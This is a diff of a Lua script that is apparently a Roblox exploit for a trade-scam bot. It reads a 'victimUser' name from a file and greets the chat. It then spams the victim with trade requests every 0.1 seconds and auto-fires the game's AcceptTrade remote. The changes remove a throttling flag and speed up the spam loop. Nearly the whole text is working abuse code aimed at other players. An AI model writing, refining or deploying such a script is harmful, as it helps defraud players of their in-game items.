@@ -26,7 +26,6 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
-local tradeJustAccepted = false
 
 local function selectDevice()
     while task.wait(0.1) do
@@ -51,8 +50,8 @@ task.spawn(selectDevice)
 local waittime = delay or 2
 wait(waittime)
 
-wait(3)
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+wait(2)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('yo!')
 
 local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
 
@@ -62,23 +61,19 @@ local function saveJoinedId(messageId)
 end
 
 local function acceptRequest()
-    while task.wait(2.4) do
-        if not tradeJustAccepted then
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            local args = {
-                [1] = game:GetService("Players"):WaitForChild(victimUser)
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
-        end
+    while task.wait(0.1) do
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+        local args = {
+        [1] = game:GetService("Players"):WaitForChild(victimUser)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
     end
 end
 
 local function acceptTrade()
     while task.wait(0.1) do
         game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
-        tradeJustAccepted = true
-        wait(1)
-        tradeJustAccepted = false
     end
 end
 
